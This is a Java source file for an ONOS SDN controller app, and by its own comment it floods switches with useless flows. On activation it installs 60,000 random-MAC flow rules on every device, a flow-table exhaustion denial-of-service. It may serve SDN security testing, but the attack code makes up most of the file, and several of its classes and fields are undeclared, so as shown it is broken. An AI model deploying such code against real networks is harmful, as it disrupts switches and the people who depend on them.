/*
 * Copyright 2017-present Open Networking Laboratory
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.app8;

import org.apache.felix.scr.annotations.*;
import org.onosproject.net.device.DeviceService;
import org.onlab.packet.Ethernet;
import org.onlab.packet.Ip4Prefix;
import org.onlab.packet.IpAddress;
import org.onlab.packet.MacAddress;
import org.onosproject.net.flow.*;
import org.onosproject.net.flowobjective.DefaultForwardingObjective;
import org.onosproject.net.flowobjective.FlowObjectiveService;
import org.onosproject.net.flowobjective.ForwardingObjective;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.Random;
import java.util.*;

/**
 * Application that tries to flood switches with useless flows
 */
@Component(immediate = true)
public class AppComponent {

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowRuleService flowRuleService;

    @Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT, label = "Configure Flow Timeout for installed flow rules; ")
    private int flowTimeout = DEFAULT_TIMEOUT;

    private ApplicationId appId;

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Activate
    protected void activate() {
        log.info("Application 8 started : beginning flooding on switches {}", flowTimeout);

        appId = coreService.registerApplication("org.app8");

        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> devices = deviceService.getDevices();
        Iterator it = devices.iterator();

        Random random = new Random();

        while(it.hasNext())
        {
            Device device = (Device)it.next();

            for(int i=0; i<60000; i++)
            {
                selector.matchEthDst(MacAddress.valueOf(random.nextLong()));
                FlowRule new_flow = new DefaultFlowRule(device.id(), selector.build(), treat.build(), 16000, appId, flowTimeout, true, null);
                flowRuleService.applyFlowRules(new_flow);
            }
        }
    }

    @Deactivate
    protected void deactivate() {
        log.info("Application 8 stopped");
    }
}
